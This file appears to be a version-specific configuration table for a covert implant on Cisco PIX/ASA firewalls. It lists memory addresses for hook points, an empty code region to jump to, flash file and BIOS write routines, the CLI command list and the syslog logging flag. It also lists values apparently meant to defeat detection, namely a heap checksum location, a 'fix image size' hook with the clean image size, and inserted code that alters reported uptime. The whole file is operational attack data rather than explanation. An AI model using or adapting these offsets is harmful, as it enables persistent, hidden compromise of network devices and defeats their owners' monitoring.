; --- SECTION I ---
;
0x40082400            // pix version
0x213a000             // address of implant configuration
0x3a  0x00000424      // offset to send channel in channel list
0x3b  0x0847bec0      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x0847bfa0      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x0847b500      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x0847bde0      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000040      // offset to next IP fragment pointer in block
0x40  0x09f9dc80      // address of context list
0x42  0x0931bdb0      // checkheaps checksum location
0x43  0x085167d0      // get booted image's filename
0x44  0x083ada5f      // fix image size hook point
0x45  0x01c916c4      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
0x52  0x0855e380      // ipv6_encap
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x0870fdcb      // address of our hook point
HookedCall                0x087143f0      // called function being hooked
JmpLocation               0x091f395a      // empty area to jump to
InterfaceAddr             0x09e3b930      // same as 0x30 above
InterfaceLeng             0x000001a4      // length of interface struct
IntSecurityOffset         0xffffff5c            // security level field offset
IntNameOffset             0x00000174      // interface name field offset
IntNumOffset              0x000000df      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x18            // ip address offset in the interface struct
IntNetmaskOffset          0x1c            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0xffffffff      // addr of crypto structure
ArpTableAddrPtr           0x0999087c      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x09f8e160      // addr of the bios class structure
BiosWriteAddr1            0x083a19c0      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x083a5000      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x083a4d80      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x083a5bd0      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x0847cab0      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x083aecd0      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x083915a0      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x083ae3c0      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x08391280      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x0847c1a0      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x0847cd90      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x0847c640      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x0847c7a0      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x0847dc60      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x093135b0      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x08066aa0      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x098f8960      // addr of duart/0 tty entry
CIStartFunc               0x080cbe40      // addr of the command interface start function -- telnet function
CommandListAddr           0x099ddde0      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x09da07f4      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x09306490      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x0a126ea0      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000bc4      // offset into the syslog structure where the logging level is stored
Open                      0x08066c90      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x09885b04      // Address where the thread timeout value is stored 
UpTimeCounter             0x09f78828      // Address of the up time counter
Display_uptime_addr       0x080d5630      // Address of the function that display the uptime
Inserted_code_addr        0x091f395a      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x092ec430      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x092ec5e0      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080cc321      // Address of hook into the command interface
AvailMemoryPtr            0x0a0c225c      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
